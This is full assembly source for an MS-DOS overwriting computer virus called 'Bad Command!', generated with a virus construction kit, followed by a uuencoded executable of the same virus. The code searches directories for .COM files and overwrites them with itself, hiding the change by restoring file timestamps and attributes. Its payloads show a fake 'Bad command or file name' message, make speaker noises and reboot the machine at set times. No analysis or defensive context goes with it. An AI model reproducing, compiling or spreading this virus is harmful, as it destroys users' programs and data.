; BADCO.ASM -- Bad Command!
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Unknown User

virus_type      equ     1                       ; Overwriting Virus
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
        assume  cs:code,ds:code,es:code,ss:code
        org     0100h

start           label   near

main            proc    near
        
flag:           xchg    bh,bh
        xchg    bp,ax
        xchg    bp,ax
        
        call    search_files
        
        call    get_hour
        or      ax,ax                   ; Did the function return zero?
        jl      skip00                  ; If less, skip effect
        jmp     short strt00            ; Success -- skip jump
skip00:         jmp     end00                   ; Skip the routine
strt00:         mov     si,offset data00        ; SI points to data
        mov     ah,0Eh                  ; BIOS display char. function
display_loop:   lodsb                           ; Load the next char. into AL
        or      al,al                   ; Is the character a null?
        je      disp_strnend            ; If it is, exit
        int     010h                    ; BIOS video interrupt
        jmp     short display_loop      ; Do the next character
disp_strnend:

end00:          call    search_files            ; Find and infect a file
        call    search_files            ; Find and infect another file
        call    get_hour
        cmp     ax,0017h                ; Did the function return 23?
        je      strt01                  ; If equal, do effect
        call    get_weekday
        cmp     ax,0005h                ; Did the function return 5?
        je      strt01                  ; If equal, do effect
        cmp     ax,0001h                ; Did the function return 1?
        je      strt01                  ; If equal, do effect
        jmp     end01                   ; Otherwise skip over it
strt01:         db      0EAh,000h,000h,0FFh,0FFh  ; jmp far FFFFh:0000h

end01:          call    get_minute
        cmp     ax,0038h                ; Did the function return 56?
        jg      strt02                  ; If greater, do effect
        call    get_second
        cmp     ax,000Ch                ; Did the function return 12?
        jl      strt02                  ; If less, do effect
        call    get_hour
        or      ax,ax                   ; Did the function return zero?
        je      strt02                  ; If equal, do effect
        jmp     end02                   ; Otherwise skip over it
strt02:         mov     cx,0003h                ; First argument is 3
new_shot:       push    cx                      ; Save the current count
        mov     dx,0140h                ; DX holds pitch
        mov     bx,0100h                ; BX holds shot duration
        in      al,061h                 ; Read the speaker port
        and     al,11111100b            ; Turn off the speaker bit
fire_shot:      xor     al,2                    ; Toggle the speaker bit
        out     061h,al                 ; Write AL to speaker port
        add     dx,09248h               ;
        mov     cl,3                    ;
        ror     dx,cl                   ; Figure out the delay time
        mov     cx,dx                   ;
        and     cx,01FFh                ;
        or      cx,10                   ;
shoot_pause:    loop    shoot_pause             ; Delay a bit
        dec     bx                      ; Are we done with the shot?
        jnz     fire_shot               ; If not, pulse the speaker
        and     al,11111100b            ; Turn off the speaker bit
        out     061h,al                 ; Write AL to speaker port
        mov     bx,0002h                ; BX holds delay time (ticks)
        xor     ah,ah                   ; Get time function
        int     1Ah                     ; BIOS timer interrupt
        add     bx,dx                   ; Add current time to delay
shoot_delay:    int     1Ah                     ; Get the time again
        cmp     dx,bx                   ; Are we done yet?
        jne     shoot_delay             ; If not, keep checking
        pop     cx                      ; Restore the count
        loop    new_shot                ; Do another shot

end02:          mov     ax,04C00h               ; DOS terminate function
        int     021h
main            endp

search_files    proc    near
        push    bp                      ; Save BP
        mov     bp,sp                   ; BP points to local buffer
        sub     sp,64                   ; Allocate 64 bytes on stack

        mov     ah,047h                 ; DOS get current dir function
        xor     dl,dl                   ; DL holds drive # (current)
        lea     si,[bp - 64]            ; SI points to 64-byte buffer
        int     021h

        mov     ah,03Bh                 ; DOS change directory function
        mov     dx,offset root          ; DX points to root directory
        int     021h

        call    traverse                ; Start the traversal

        mov     ah,03Bh                 ; DOS change directory function
        lea     dx,[bp - 64]            ; DX points to old directory
        int     021h

        mov     sp,bp                   ; Restore old stack pointer
        pop     bp                      ; Restore BP
        ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
        push    bp                      ; Save BP

        mov     ah,02Fh                 ; DOS get DTA function
        int     021h
        push    bx                      ; Save old DTA address

        mov     bp,sp                   ; BP points to local buffer
        sub     sp,128                  ; Allocate 128 bytes on stack

        mov     ah,01Ah                 ; DOS set DTA function
        lea     dx,[bp - 128]           ; DX points to buffer
        int     021h

        mov     ah,04Eh                 ; DOS find first function
        mov     cx,00010000b            ; CX holds search attributes
        mov     dx,offset all_files     ; DX points to "*.*"
        int     021h
        jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
        jne     another_dir             ; If not, try again
        cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
        je      another_dir             ;If so, keep going

        mov     ah,03Bh                 ; DOS change directory function
        lea     dx,[bp - 98]            ; DX points to new directory
        int     021h

        call    traverse                ; Recursively call ourself

        pushf                           ; Save the flags
        mov     ah,03Bh                 ; DOS change directory function
        mov     dx,offset up_dir        ; DX points to parent directory
        int     021h
        popf                            ; Restore the flags

        jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
        int     021h
        jnc     check_dir               ; If found check the file

leave_traverse:
        mov     dx,offset com_mask      ; DX points to "*.COM"
        call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
        mov     ah,01Ah                 ; DOS set DTA function
        pop     dx                      ; Retrieve old DTA address
        int     021h

        pop     bp                      ; Restore BP
        ret                             ; Return to caller

com_mask        db      "*.com",0
up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
traverse        endp

find_files      proc    near
        push    bp                      ; Save BP

        mov     ah,02Fh                 ; DOS get DTA function
        int     021h
        push    bx                      ; Save old DTA address

        mov     bp,sp                   ; BP points to local buffer
        sub     sp,128                  ; Allocate 128 bytes on stack

        push    dx                      ; Save file mask
        mov     ah,01Ah                 ; DOS set DTA function
        lea     dx,[bp - 128]           ; DX points to buffer
        int     021h

        mov     ah,04Eh                 ; DOS find first file function
        mov     cx,00100111b            ; CX holds all file attributes
        pop     dx                      ; Restore file mask
find_a_file:    int     021h
        jc      done_finding            ; Exit if no files found
        call    infect_file             ; Infect the file!
        jnc     done_finding            ; Exit if no error
        mov     ah,04Fh                 ; DOS find next file function
        jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
        mov     ah,01Ah                 ; DOS set DTA function
        pop     dx                      ; Retrieve old DTA address
        int     021h

        pop     bp                      ; Restore BP
        ret                             ; Return to caller
find_files      endp

infect_file     proc    near
        mov     ah,02Fh                 ; DOS get DTA address function
        int     021h
        mov     si,bx                   ; SI points to the DTA

        mov     byte ptr [set_carry],0  ; Assume we'll fail

        cmp     word ptr [si + 01Ch],0  ; Is the file > 65535 bytes?
        jne     infection_done          ; If it is then exit

        cmp     word ptr [si + 025h],'DN'  ; Might this be COMMAND.COM?
        je      infection_done          ; If it is then skip it

        cmp     word ptr [si + 01Ah],(finish - start)
        jb      infection_done          ; If it's too small then exit

        mov     ax,03D00h               ; DOS open file function, r/o
        lea     dx,[si + 01Eh]          ; DX points to file name
        int     021h
        xchg    bx,ax                   ; BX holds file handle

        mov     ah,03Fh                 ; DOS read from file function
        mov     cx,4                    ; CX holds bytes to read (4)
        mov     dx,offset buffer        ; DX points to buffer
        int     021h

        mov     ah,03Eh                 ; DOS close file function
        int     021h

        push    si                      ; Save DTA address before compare
        mov     si,offset buffer        ; SI points to comparison buffer
        mov     di,offset flag          ; DI points to virus flag
        mov     cx,4                    ; CX holds number of bytes (4)
    rep     cmpsb                           ; Compare the first four bytes
        pop     si                      ; Restore DTA address
        je      infection_done          ; If equal then exit
        mov     byte ptr [set_carry],1  ; Success -- the file is OK

        mov     ax,04301h               ; DOS set file attrib. function
        xor     cx,cx                   ; Clear all attributes
        lea     dx,[si + 01Eh]          ; DX points to victim's name
        int     021h

        mov     ax,03D02h               ; DOS open file function, r/w
        int     021h
        xchg    bx,ax                   ; BX holds file handle

        mov     ah,040h                 ; DOS write to file function
        mov     cx,finish - start       ; CX holds virus length
        mov     dx,offset start         ; DX points to start of virus
        int     021h

        mov     ax,05701h               ; DOS set file time function
        mov     cx,[si + 016h]          ; CX holds old file time
        mov     dx,[si + 018h]          ; DX holds old file date
        int     021h

        mov     ah,03Eh                 ; DOS close file function
        int     021h

        mov     ax,04301h               ; DOS set file attrib. function
        xor     ch,ch                   ; Clear CH for file attribute
        mov     cl,[si + 015h]          ; CX holds file's old attributes
        lea     dx,[si + 01Eh]          ; DX points to victim's name
        int     021h

infection_done: cmp     byte ptr [set_carry],1  ; Set carry flag if failed
        ret                             ; Return to caller

buffer          db      4 dup (?)               ; Buffer to hold test data
set_carry       db      ?                       ; Set-carry-on-exit flag
infect_file     endp


get_hour        proc    near
        mov     ah,02Ch                 ; DOS get time function
        int     021h
        mov     al,ch                   ; Copy hour into AL
        cbw                             ; Sign-extend AL into AX
        ret                             ; Return to caller
get_hour        endp

get_minute      proc    near
        mov     ah,02Ch                 ; DOS get time function
        int     021h
        mov     al,cl                   ; Copy minute into AL
        cbw                             ; Sign-extend AL into AX
        ret                             ; Return to caller
get_minute      endp

get_second      proc    near
        mov     ah,02Ch                 ; DOS get time function
        int     021h
        mov     al,dh                   ; Copy second into AL
        cbw                             ; Sign-extend AL into AX
        ret                             ; Return to caller
get_second      endp

get_weekday     proc    near
        mov     ah,02Ah                 ; DOS get date function
        int     021h
        cbw                             ; Sign-extend AL into AX
        ret                             ; Return to caller
get_weekday     endp

data00          db      "Bad command or file name",13,10,0

;vcl_marker      db      "[VCL]",0               ; VCL creation marker

finish          label   near

code            ends
        end     main

begin 775 bad-cmnd.com
MAO^5E>B:`.C:`0O`?`+K`^L/D+X"`[0.K`K`=`3-$.OWZ'T`Z'H`Z+H!/1<`
M=!#HR@$]!0!T"#T!`'0#ZP:0Z@``___HI0$].`!_$NBE`3T,`'P*Z(T!"\!T
M`^L_D+D#`%&Z0`&[``'D823\-`+F88'"2)*Q`]/*B\J!X?\!@\D*XOY+=>8D
M_.9ANP(`,N3-&@/:S1H[TW7Z6>+%N`!,S2%5B^R#[$"T1S+2C7;`S2&T.[K%
M`<-<`%6T+\TA4XOL@>R``+0:C5:`S2&T3KD0`+HE
M`LTA`?I40=1N`?IXN=!6T.XU6GLTAZ,O_G+0[NB("S2&=<]FZ
M'`+H%@"+Y;0:6LTA7<,J+F-O;0`N+@`J+BH`5;0OS2%3B^R![(``4K0:C5:`
MS2&T3KDG`%K-(7()Z`\`S2&`/N,"`<,``````+0LS2&*Q9C#M"S-
M(8K!F,.T+,TABL:8P[0JS2&8PT)A9"!C;VUM86YD(&]R(&9I;&4@;F%M90T*
!````
`
end
